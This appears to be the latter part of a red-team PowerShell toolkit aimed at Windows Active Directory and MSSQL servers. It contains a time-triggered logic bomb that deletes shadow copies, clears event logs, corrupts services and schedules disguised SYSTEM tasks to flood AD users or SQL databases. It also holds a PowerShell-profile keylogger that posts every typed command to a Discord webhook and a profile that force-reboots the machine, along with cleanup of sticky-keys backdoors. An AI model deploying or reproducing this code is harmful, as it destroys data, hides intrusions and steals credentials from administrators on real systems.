        Write-Section "D / Remove DDL Trigger + xp_cmdshell"
        try {
            & sqlcmd.exe -S "(local)" -E -Q "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'rt_logon_watchdog') DROP TRIGGER rt_logon_watchdog ON ALL SERVER; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;" 2>&1 | Out-Null
            Write-Success "DDL trigger removed, xp_cmdshell disabled"
        } catch { Write-Warn "DDL trigger/xp_cmdshell cleanup failed: $_" }

        Write-Section "C / Remove SQL Agent Job"
        try {
            & sqlcmd.exe -S "(local)" -E -Q "EXEC msdb.dbo.sp_delete_job @job_name='SystemHealthMonitor', @delete_unused_schedule=1;" 2>&1 | Out-Null
            Write-Success "SQL Agent job removed"
        } catch { Write-Warn "SQL Agent job removal failed: $_" }

        Write-Section "B / Remove SQL Login + Auth Mode"
        try {
            & sqlcmd.exe -S "(local)" -E -Q "IF EXISTS (SELECT name FROM sys.server_principals WHERE name = '$SqlLoginName') DROP LOGIN [$SqlLoginName];" 2>&1 | Out-Null
            Write-Success "SQL login $SqlLoginName removed"
        } catch { Write-Warn "SQL login removal failed: $_" }

        if ($state -and $null -ne $state.original_login_mode) {
            try {
                $sqlInstKey = if ($state.sql_inst_key) { $state.sql_inst_key } else {
                    Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
                        Where-Object { $_.PSChildName -match "^MSSQL\d+" } | Select-Object -First 1 -ExpandProperty PSChildName
                }
                if ($sqlInstKey) {
                    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer" `
                        -Name LoginMode -Value $state.original_login_mode -Force
                    Restart-Service MSSQLSERVER -Force -ErrorAction SilentlyContinue
                    Write-Success "SQL auth mode restored"
                }
            } catch { Write-Warn "Auth mode restore failed: $_" }
        }

        Write-Section "A / Restore Accessibility Binaries"
        if ($state -and $state.stickykeys_backups) {
            foreach ($entry in $state.stickykeys_backups) {
                try {
                    Copy-Item $entry.Backup $entry.Original -Force -ErrorAction Stop
                    Remove-Item $entry.Backup -Force -ErrorAction SilentlyContinue
                    Write-Success "Restored: $($entry.Original)"
                } catch { Write-Warn "Restore failed: $_" }
            }
        }
        foreach ($bin in @("sethc.exe", "utilman.exe")) {
            $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin"
            Remove-Item $ifeoKey -Force -Recurse -ErrorAction SilentlyContinue
        }
        Write-Success "IFEO Debugger keys removed"
        Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
        Write-Success "PersistMSSQL cleanup complete"
    }
    } # end switch
}

# ==============================================================================
# MODULE: LOGIC BOMB  (from 05_logicbomb.ps1)
# ==============================================================================
function Invoke-LogicBomb {
    param([string]$Mode = "deploy")

    $StateDir      = "C:\Windows\System32\spool\drivers\color"
    $StateFile     = "$StateDir\.rt21-bomb.json"
    $DropDir       = $script:DropDir
    $TaskName      = "SystemDiagnosticsCollector"
    $TaskPath      = "\Microsoft\Windows\Diagnosis\"
    $FloodTaskName = "WindowsIdentitySync"
    $FloodTaskPath = "\Microsoft\Windows\WindowsUpdate\"

    $IsAD    = (Get-Service "NTDS"        -ErrorAction SilentlyContinue) -ne $null
    $IsMSSQL = (Get-Service "MSSQLSERVER" -ErrorAction SilentlyContinue) -ne $null
    $BombBoxType = if ($IsAD) { "AD" } elseif ($IsMSSQL) { "MSSQL" } else { "UNKNOWN" }

    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
    Write-Host "   Nov 21 2026 -- Logic Bomb / Time-Triggered Payload"   -ForegroundColor Yellow
    Write-Host "   Box type: $BombBoxType"                                -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed

    function Invoke-ADPayload_Bomb {
        Write-Section "PAYLOAD / AD Box Destruction"

        try {
            $dnsSvc = "HKLM:\SYSTEM\CurrentControlSet\Services\DNS"
            Set-ItemProperty $dnsSvc -Name ImagePath -Value "C:\Windows\System32\NonExistent_dns.exe" -Force
            Write-Success "DNS ImagePath corrupted"
        } catch { Write-Warn "DNS ImagePath: $_" }

        $ntdsDir = "C:\Windows\NTDS"
        if (Test-Path $ntdsDir) {
            try {
                $acl  = Get-Acl $ntdsDir
                $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
                    "Everyone",
                    [System.Security.AccessControl.FileSystemRights]::FullControl,
                    [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
                    [System.Security.AccessControl.PropagationFlags]::None,
                    [System.Security.AccessControl.AccessControlType]::Deny
                )
                $acl.AddAccessRule($deny); Set-Acl -Path $ntdsDir -AclObject $acl -ErrorAction Stop
                Write-Success "NTDS dir ACL locked (Everyone:FullControl DENY)"
            } catch { Write-Warn "NTDS ACL: $_" }
        }

        try { & net.exe accounts /maxpwage:0 /minpwlen:20 2>&1 | Out-Null; Write-Success "Password policy poisoned" } catch {}
        try { & vssadmin.exe delete shadows /all /quiet 2>&1 | Out-Null; & wmic.exe shadowcopy delete 2>&1 | Out-Null; Write-Success "Shadow copies deleted" } catch {}
        foreach ($log in @("Security","System","Application","Directory Service","DNS Server")) {
            try { & wevtutil.exe cl $log 2>&1 | Out-Null } catch {}
        }
        Write-Success "Event logs cleared"

        New-Item -Path $DropDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $floodScript = @'
try {
    $de  = [ADSI]("LDAP://CN=Users," + ([ADSI]"LDAP://RootDSE").defaultNamingContext[0])
    $end = (Get-Date).AddSeconds(270)
    while ((Get-Date) -lt $end) {
        $n = "u" + [guid]::NewGuid().ToString("N").Substring(0,10)
        try { $u = $de.Children.Add("CN=$n", "user"); $u.Put("sAMAccountName", $n); $u.CommitChanges() } catch {}
    }
} catch {}
'@
        $floodPath = "$DropDir\rtflood_ad.ps1"
        Set-Content $floodPath -Value $floodScript -Encoding UTF8 -Force
        try { (Get-Item $floodPath -Force).Attributes = "Hidden,System" } catch {}
        try {
            Unregister-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath -Confirm:$false -ErrorAction SilentlyContinue
            $action    = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -File `"$floodPath`""
            $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
            $trigger.Repetition.Interval = "PT5M"; $trigger.Repetition.Duration = "P1Y"
            $settings  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([timespan]::FromMinutes(5)) -MultipleInstances Parallel -Hidden
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
            Register-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath `
                -Action $action -Trigger $trigger -Settings $settings -Principal $principal `
                -Description "Synchronizes Windows identity federation metadata" -Force -ErrorAction Stop | Out-Null
            Write-Success "AD user flood task registered (every 5 min)"
        } catch { Write-Warn "User flood task failed: $_" }
    }

    function Invoke-MSSQLPayload_Bomb {
        Write-Section "PAYLOAD / MSSQL Box Destruction"

        try { & sqlcmd.exe -S "(local)" -E -Q "ALTER DATABASE master SET SINGLE_USER WITH ROLLBACK IMMEDIATE;" 2>&1 | Out-Null; Write-Success "master DB set to SINGLE_USER" } catch {}
        try { Set-Service MSSQLSERVER -StartupType Disabled -ErrorAction SilentlyContinue; Stop-Service MSSQLSERVER -Force -ErrorAction SilentlyContinue; Write-Success "MSSQLSERVER stopped and disabled" } catch {}

        $sqlInstKey = $null
        try {
            $sqlInstKey = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
                Where-Object { $_.PSChildName -match "^MSSQL\d+" } | Select-Object -First 1 -ExpandProperty PSChildName
        } catch {}

        if ($sqlInstKey) {
            $paramPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer\Parameters"
            try {
                $existing = (Get-ItemProperty $paramPath -ErrorAction SilentlyContinue).PSObject.Properties |
                    Where-Object { $_.Name -like "SQLArg*" } | Measure-Object | Select-Object -ExpandProperty Count
                New-ItemProperty $paramPath -Name "SQLArg$existing" -Value "-eC:\NonExistent\ERRORLOG_rt" -Force | Out-Null
                Write-Success "Invalid startup param injected"
            } catch { Write-Warn "Startup param: $_" }

            $tcpPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer\SuperSocketNetLib\Tcp\IPAll"
            if (Test-Path $tcpPath) {
                try { Set-ItemProperty $tcpPath -Name TcpPort -Value "" -Force; Set-ItemProperty $tcpPath -Name TcpDynamicPorts -Value "" -Force; Write-Success "SQL TCP port nulled" } catch {}
            }
        }

        try { & vssadmin.exe delete shadows /all /quiet 2>&1 | Out-Null; & wmic.exe shadowcopy delete 2>&1 | Out-Null; Write-Success "Shadow copies deleted" } catch {}
        foreach ($log in @("Security","System","Application","Windows PowerShell")) {
            try { & wevtutil.exe cl $log 2>&1 | Out-Null } catch {}
        }
        Write-Success "Event logs cleared"

        New-Item -Path $DropDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $floodSqlPath = "$DropDir\rtflood_sql.sql"
        $floodSql = @'
DECLARE @end  DATETIME = DATEADD(SECOND, 240, GETDATE())
DECLARE @n NVARCHAR(100); DECLARE @sql NVARCHAR(500); DECLARE @data NVARCHAR(260)
SELECT @data = physical_name FROM sys.master_files WHERE database_id = 1 AND type = 0
SET @data = LEFT(@data, LEN(@data) - CHARINDEX('\', REVERSE(@data)))
WHILE GETDATE() < @end BEGIN
    SET @n   = N'rtdb_' + LOWER(REPLACE(CONVERT(NVARCHAR(36), NEWID()), '-', ''))
    SET @sql = N'CREATE DATABASE [' + @n + N'] ON PRIMARY (NAME=''' + @n + N''', FILENAME=''' + @data + N'\' + @n + N'.mdf'', SIZE=64MB, FILEGROWTH=0) LOG ON (NAME=''' + @n + N'_log'', FILENAME=''' + @data + N'\' + @n + N'_log.ldf'', SIZE=8MB, FILEGROWTH=0)'
    BEGIN TRY EXEC(@sql) END TRY BEGIN CATCH END CATCH
END
DECLARE @i INT = 0
WHILE @i < 2 BEGIN
    BEGIN TRY
        SELECT TOP 1 a.object_id FROM sys.all_columns a CROSS JOIN sys.all_columns b CROSS JOIN sys.all_columns c ORDER BY NEWID()
    END TRY BEGIN CATCH END CATCH
    SET @i = @i + 1
END
'@
        Set-Content $floodSqlPath -Value $floodSql -Encoding UTF8 -Force
        try { (Get-Item $floodSqlPath -Force).Attributes = "Hidden,System" } catch {}
        try {
            Unregister-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath -Confirm:$false -ErrorAction SilentlyContinue
            $action    = New-ScheduledTaskAction -Execute "sqlcmd.exe" -Argument "-S (local) -E -i `"$floodSqlPath`" -t 300"
            $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
            $trigger.Repetition.Interval = "PT5M"; $trigger.Repetition.Duration = "P1Y"
            $settings  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([timespan]::FromMinutes(5)) -MultipleInstances Parallel -Hidden
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
            Register-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath `
                -Action $action -Trigger $trigger -Settings $settings -Principal $principal `
                -Description "Synchronizes Windows identity federation metadata" -Force -ErrorAction Stop | Out-Null
            Write-Success "SQL database flood + tempdb hammer task registered (every 5 min)"
        } catch { Write-Warn "SQL flood task failed: $_" }
    }

    switch ($Mode.ToLower()) {

    "detonate" {
        Write-Info "Immediate detonation triggered"
        if ($IsAD)       { Invoke-ADPayload_Bomb    }
        elseif ($IsMSSQL) { Invoke-MSSQLPayload_Bomb }
        else { Write-Err "Could not detect box type" }
    }

    "deploy" {
        New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $detonateTime = [datetime]::new(2026, 11, 21, 12, 0, 0)
        Write-Info "Detonation scheduled: $($detonateTime.ToString('yyyy-MM-dd HH:mm:ss')) (CST)"

        $thisScript = "$DropDir\rtbomb.ps1"
        try {
            $src = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.ScriptName }
            if ($src -and (Test-Path $src)) {
                Copy-Item $src $thisScript -Force -ErrorAction Stop
                try { (Get-Item $thisScript -Force).Attributes = "Hidden,System" } catch {}
                Write-Success "Payload stashed: $thisScript"
            } else { Write-Warn "Could not locate script path -- bomb may fail if toolkit is wiped" }
        } catch { Write-Warn "Stash failed: $_" }

        try {
            Unregister-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Confirm:$false -ErrorAction SilentlyContinue
            $action    = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -File `"$thisScript`" -Action detonate"
            $trigger   = New-ScheduledTaskTrigger -Once -At $detonateTime
            $settings  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([timespan]::FromMinutes(10)) -MultipleInstances IgnoreNew -Hidden
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
            Register-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath `
                -Action $action -Trigger $trigger -Settings $settings -Principal $principal `
                -Description "Collects system diagnostics for health monitoring baseline" `
                -Force -ErrorAction Stop | Out-Null
            Write-Success "Logic bomb task registered: $TaskPath$TaskName"
            Write-Success "Detonation: $($detonateTime.ToString('HH:mm:ss')) ($([math]::Round(($detonateTime - (Get-Date)).TotalMinutes)) min from now)"
            $script:KeyInfo["bomb"] = "Detonates 2026-11-21 12:00 CST ($([math]::Round(($detonateTime - (Get-Date)).TotalMinutes)) min)"
        } catch { Write-Err "Task registration failed: $_" }

        @{
            deployed_at = (Get-Date -Format "o"); detonate_at = $detonateTime.ToString("o")
            task_name = $TaskName; task_path = $TaskPath; box_type = $BombBoxType; script_path = $thisScript
        } | ConvertTo-Json | Set-Content -Path $StateFile -Encoding UTF8
        Write-Success "State: $StateFile"
    }

    "cleanup" {
        Write-Section "Disarming Logic Bomb"
        try { Unregister-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Confirm:$false -ErrorAction Stop; Write-Success "Task removed" } catch {}
        try { Unregister-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath -Confirm:$false -ErrorAction Stop; Write-Success "Flood task removed" } catch {}
        Remove-Item "$DropDir\rtflood_ad.ps1"  -Force -ErrorAction SilentlyContinue
        Remove-Item "$DropDir\rtflood_sql.sql" -Force -ErrorAction SilentlyContinue
        Remove-Item "$DropDir\rtbomb.ps1"      -Force -ErrorAction SilentlyContinue
        Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
        Write-Success "Logic bomb disarmed"
    }
    } # end switch
}

# ==============================================================================
# MODULE: SHELL POISON  (from 06_shell_poison.ps1)
# ==============================================================================
function Invoke-ShellPoison {
    param([string]$Mode = "deploy", [string]$Webhook = "")

    $StateDir    = "C:\Windows\System32\spool\drivers\color"
    $StateFile   = "$StateDir\.rt21-poison.json"
    $ProfilePath = "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
    $DefaultWH   = "https://discord.com/api/webhooks/REPLACE_ME"

    if (-not $Webhook) { $Webhook = $env:DISCORD_WEBHOOK }
    if (-not $Webhook) { $Webhook = $DefaultWH }

    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
    Write-Host "   Nov 21 2026 -- PowerShell Profile Poison"             -ForegroundColor Yellow
    Write-Host "   All-users profile -> Discord command keylogger"       -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed

    switch ($Mode.ToLower()) {

    "deploy" {
        if ($Webhook -eq $DefaultWH -or $Webhook -match "REPLACE_ME") {
            Write-Warn "WebhookUrl not set -- logs will fail silently. Pass -WebhookUrl to fix."
        }

        New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $hadExisting = Test-Path $ProfilePath
        $backupPath  = "$StateDir\.rt21-profile-backup.ps1"
        if ($hadExisting) { Copy-Item $ProfilePath $backupPath -Force -ErrorAction SilentlyContinue }

        $poisonBlock = @"

# -- rt21 --
if (`$Host.Name -eq 'ConsoleHost') {
    `$__rt_wh = '$Webhook'
    Set-PSReadLineOption -AddToHistoryHandler {
        param([string]`$line)
        if (`$line.Trim() -eq '') { return `$true }
        try {
            `$ts   = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
            `$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            `$hn   = `$env:COMPUTERNAME
            `$msg  = "[`$ts] `$user @ `$hn > `$line"
            `$body = [System.Text.Encoding]::UTF8.GetBytes(('{"content":' + ('"' + `$msg.Replace('\','\\').Replace('"','\"') + '"') + '}'))
            `$req  = [System.Net.WebRequest]::Create(`$__rt_wh)
            `$req.Method = 'POST'; `$req.ContentType = 'application/json'; `$req.Timeout = 3000
            `$stream = `$req.GetRequestStream(); `$stream.Write(`$body, 0, `$body.Length); `$stream.Close()
            `$req.GetResponse().Close()
        } catch {}
        return `$true
    }
}
# -- /rt21 --
"@

        try {
            $profileDir = Split-Path $ProfilePath
            if (-not (Test-Path $profileDir)) { New-Item $profileDir -ItemType Directory -Force | Out-Null }
            Add-Content -Path $ProfilePath -Value $poisonBlock -Encoding UTF8 -ErrorAction Stop
            Write-Success "Poison block appended to $ProfilePath"
            Write-Success "Webhook: $Webhook"
            if (-not ($Webhook -match "REPLACE_ME")) { $script:KeyInfo["shellpoison"] = "Webhook: $Webhook" }
        } catch { Write-Err "Profile write failed: $_" }

        @{
            deployed_at = (Get-Date -Format "o"); profile_path = $ProfilePath
            backup_path = if ($hadExisting) { $backupPath } else { $null }
            had_existing = $hadExisting; webhook_url = $Webhook
        } | ConvertTo-Json | Set-Content -Path $StateFile -Encoding UTF8 -Force
    }

    "cleanup" {
        $state = $null
        if (Test-Path $StateFile) { try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json } catch {} }

        Write-Section "Removing profile poison"
        if ($state -and -not $state.had_existing -and (Test-Path $ProfilePath)) {
            Remove-Item $ProfilePath -Force -ErrorAction SilentlyContinue
            Write-Success "Profile deleted (didn't exist pre-deploy)"
        } elseif ($state -and $state.had_existing -and $state.backup_path -and (Test-Path $state.backup_path)) {
            Copy-Item $state.backup_path $ProfilePath -Force -ErrorAction Stop
            Remove-Item $state.backup_path -Force -ErrorAction SilentlyContinue
            Write-Success "Original profile restored from backup"
        } else {
            if (Test-Path $ProfilePath) {
                $content = Get-Content $ProfilePath -Raw -Encoding UTF8
                $cleaned = $content -replace '(?s)\r?\n# -- rt21 --.*?# -- /rt21 --\r?\n', ''
                Set-Content $ProfilePath -Value $cleaned -Encoding UTF8 -Force
                Write-Success "rt21 block stripped from $ProfilePath"
            }
        }
        Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
        Write-Success "ShellPoison cleanup complete"
    }
    } # end switch
}

# ==============================================================================
# MODULE: REBOOT POISON  (from 07_reboot_poison.ps1)
# ==============================================================================
function Invoke-RebootPoison {
    param([string]$Mode = "deploy")

    $StateDir  = "C:\Windows\System32\spool\drivers\color"
    $StateFile = "$StateDir\.rt21-reboot-poison.json"
    $Profile51 = "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
    $Profile7  = "$env:ProgramFiles\PowerShell\7\profile.ps1"

    $poisonBlock = @'

# -- rt21-reboot --
if ($Host.Name -eq 'ConsoleHost') {
    Write-Host ""
    Write-Host "  ============================================" -ForegroundColor Red
    Write-Host "  ||   YOU HAVE BEEN  F O O T  S H O T    ||" -ForegroundColor Red
    Write-Host "  ||   Rebooting in 3 seconds...           ||" -ForegroundColor Red
    Write-Host "  ||   Recovery: powershell -NoProfile     ||" -ForegroundColor Red
    Write-Host "  ============================================" -ForegroundColor Red
    Write-Host ""
    Start-Sleep -Seconds 3
    Restart-Computer -Force
}
# -- /rt21-reboot --
'@

    function Poison-RebootProfile {
        param([string]$Path)
        $dir = Split-Path $Path -Parent
        if (-not (Test-Path $dir)) { return $null }

        $backup = $null
        if (Test-Path $Path) {
            $existing = Get-Content $Path -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
            if ($existing -match '# -- rt21-reboot --') { Write-Info "Already poisoned: $Path"; return $true }
            $backup = "$StateDir\.rt21-reboot-bk-$([System.IO.Path]::GetFileNameWithoutExtension($Path)).ps1"
            Copy-Item $Path $backup -Force -ErrorAction SilentlyContinue
            $newContent = $poisonBlock + "`r`n`r`n# --- original profile ---`r`n" + $existing
            Set-Content -Path $Path -Value $newContent -Encoding UTF8 -Force
            Write-Success "Prepended to existing profile: $Path"
        } else {
            Set-Content -Path $Path -Value $poisonBlock -Encoding UTF8 -Force
            Write-Success "Created poisoned profile: $Path"
        }
        return $backup
    }

    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
    Write-Host "   Nov 21 2026 -- PS Profile Reboot Poison"             -ForegroundColor Yellow
    Write-Host "   Every interactive PS window force-reboots the box"   -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed

    switch ($Mode.ToLower()) {

    "deploy" {
        New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $state = @{ deployed_at = (Get-Date -Format "o"); profiles = @() }

        Write-Section "Poisoning PS 5.1 profile"
        $bk51 = Poison-RebootProfile -Path $Profile51
        $state["profiles"] += @{ path = $Profile51; backup = $bk51 }

        Write-Section "Poisoning PS 7 profile (if installed)"
        if (Test-Path (Split-Path $Profile7 -Parent)) {
            $bk7 = Poison-RebootProfile -Path $Profile7
            $state["profiles"] += @{ path = $Profile7; backup = $bk7 }
        } else { Write-Info "PS 7 not installed -- skipping" }

        $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8 -Force
        Write-Success "RebootPoison deployed"
        $script:KeyInfo["rebootpoison"] = "ARMED -- every PS window reboots this box"
    }

    "cleanup" {
        $state = $null
        if (Test-Path $StateFile) { try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json } catch {} }

        $targets = @($Profile51)
        if (Test-Path (Split-Path $Profile7 -Parent)) { $targets += $Profile7 }

        foreach ($path in $targets) {
            if (-not (Test-Path $path)) { continue }
            $entry = $null
            if ($state -and $state.profiles) {
                $entry = $state.profiles | Where-Object { $_.path -eq $path } | Select-Object -First 1
            }
            if ($entry -and $entry.backup -and (Test-Path $entry.backup)) {
                Copy-Item $entry.backup $path -Force -ErrorAction Stop
                Remove-Item $entry.backup -Force -ErrorAction SilentlyContinue
                Write-Success "Restored from backup: $path"
            } else {
                $content = Get-Content $path -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
                if ($content -match '# -- rt21-reboot --') {
                    $cleaned = $content -replace '(?s)\r?\n# -- rt21-reboot --.*?# -- /rt21-reboot --\r?\n', ''
                    $cleaned = $cleaned -replace '\r?\n# --- original profile ---\r?\n', ''
                    if ($cleaned.Trim() -eq '') { Remove-Item $path -Force -ErrorAction SilentlyContinue; Write-Success "Profile deleted: $path" }
                    else { Set-Content $path -Value $cleaned -Encoding UTF8 -Force; Write-Success "Poison block stripped: $path" }
                }
            }
        }
        Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
        Write-Success "RebootPoison cleanup complete"
    }
    } # end switch
}

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================

# Build module plan based on box type and action order
# Deploy order: disrupt -> persist -> bomb -> shellpoison [-> rebootpoison]
# Cleanup order: rebootpoison -> shellpoison -> bomb -> persist -> disrupt

# Detonate mode: skip orchestration, run bomb payload directly
if ($Action -eq "detonate") {
    Write-Section "DIRECT DETONATION"
    Invoke-LogicBomb -Mode "detonate"
    exit 0
}

if ($Action -eq "deploy") {
    switch ($BoxType) {
        "ad" {
            $modulePlan = @(
                @{ Name = "disrupt";     Fn = { Invoke-DisruptAD    -Mode "deploy" } },
                @{ Name = "persist";     Fn = { Invoke-PersistAD    -Mode "deploy" } },
                @{ Name = "bomb";        Fn = { Invoke-LogicBomb     -Mode "deploy" } },
                @{ Name = "shellpoison"; Fn = { Invoke-ShellPoison   -Mode "deploy" -Webhook $WebhookUrl } },
                @{ Name = "rebootpoison";Fn = { Invoke-RebootPoison  -Mode "deploy" } }
            )
        }
        "mssql" {
            $modulePlan = @(
                @{ Name = "disrupt";     Fn = { Invoke-DisruptMSSQL  -Mode "deploy" } },
                @{ Name = "persist";     Fn = { Invoke-PersistMSSQL  -Mode "deploy" } },
                @{ Name = "bomb";        Fn = { Invoke-LogicBomb      -Mode "deploy" } },
                @{ Name = "shellpoison"; Fn = { Invoke-ShellPoison    -Mode "deploy" -Webhook $WebhookUrl } },
                @{ Name = "rebootpoison";Fn = { Invoke-RebootPoison   -Mode "deploy" } }
            )
        }
        default {
            Write-Err "Unknown box type: $BoxType -- could not auto-detect AD or MSSQL service"
            Write-Err "Run with -BoxType ad or -BoxType mssql to force"
            exit 1
        }
    }
} else {
    # Cleanup -- reverse order
    switch ($BoxType) {
        "ad" {
            $modulePlan = @(
                @{ Name = "rebootpoison";Fn = { Invoke-RebootPoison  -Mode "cleanup" } },
                @{ Name = "shellpoison"; Fn = { Invoke-ShellPoison   -Mode "cleanup" } },
                @{ Name = "bomb";        Fn = { Invoke-LogicBomb     -Mode "cleanup" } },
                @{ Name = "persist";     Fn = { Invoke-PersistAD    -Mode "cleanup" } },
                @{ Name = "disrupt";     Fn = { Invoke-DisruptAD    -Mode "cleanup" } }
            )
        }
        "mssql" {
            $modulePlan = @(
                @{ Name = "rebootpoison";Fn = { Invoke-RebootPoison  -Mode "cleanup" } },
                @{ Name = "shellpoison"; Fn = { Invoke-ShellPoison   -Mode "cleanup" } },
                @{ Name = "bomb";        Fn = { Invoke-LogicBomb     -Mode "cleanup" } },
                @{ Name = "persist";     Fn = { Invoke-PersistMSSQL  -Mode "cleanup" } },
                @{ Name = "disrupt";     Fn = { Invoke-DisruptMSSQL  -Mode "cleanup" } }
            )
        }
        default {
            Write-Err "Unknown box type -- cannot cleanup. Use -BoxType ad or -BoxType mssql."
            exit 1
        }
    }
}

# Run each module
foreach ($module in $modulePlan) {
    $mname = $module.Name

    # Reboot poison only runs if -IncludeRebootPoison is set (deploy) or always on cleanup
    if ($mname -eq "rebootpoison" -and $Action -eq "deploy" -and -not $IncludeRebootPoison) {
        $script:Results[$mname] = "SKIPPED"
        continue
    }

    if ($mname -in $SkipModules) {
        $script:Results[$mname] = "SKIPPED"
        Write-Info "Skipping module: $mname (in -SkipModules)"
        continue
    }

    Write-Host ""
    Write-Host "================================================================" -ForegroundColor DarkCyan
    Write-Host "  MODULE: $($mname.ToUpper())  --  $($Action.ToUpper())" -ForegroundColor Cyan
    Write-Host "================================================================" -ForegroundColor DarkCyan

    try {
        & $module.Fn
        $script:Results[$mname] = "SUCCESS"
    } catch {
        Write-Err "$mname threw unhandled exception: $_"
        $script:Results[$mname] = "FAILED"
    }
}

# ==============================================================================
# FINAL SUMMARY
# ==============================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor White
Write-Host "  ATTACK RUN COMPLETE  --  Box: $($BoxType.ToUpper())  --  Action: $($Action.ToUpper())" -ForegroundColor White
Write-Host "================================================================" -ForegroundColor White
Write-Host ""

$allSuccess = $true
foreach ($mname in $script:Results.Keys) {
    $result = $script:Results[$mname]
    $col    = switch ($result) {
        "SUCCESS" { "Green"  }
        "FAILED"  { "Red"    }
        "SKIPPED" { "Yellow" }
        default   { "White"  }
    }
    $tag = "[$result]"
    Write-Host ("  {0,-16} " -f $mname) -NoNewline
    Write-Host ("{0,-10}" -f $tag) -ForegroundColor $col -NoNewline

    $note = if ($script:KeyInfo.Contains($mname)) { $script:KeyInfo[$mname] } else { "" }
    if ($note) {
        Write-Host "  $note" -ForegroundColor DarkGray
    } else {
        Write-Host ""
    }

    if ($result -eq "FAILED") { $allSuccess = $false }
}

Write-Host ""
if ($allSuccess) {
    Write-Host "  All modules completed." -ForegroundColor Green
} else {
    Write-Host "  Some modules FAILED -- review output above for details." -ForegroundColor Red
}

if ($Action -eq "deploy" -and -not $IncludeRebootPoison) {
    Write-Host ""
    Write-Host "  [rebootpoison SKIPPED] Add -IncludeRebootPoison to arm PS profile reboot." -ForegroundColor DarkYellow
}

Write-Host "================================================================" -ForegroundColor White
Write-Host ""
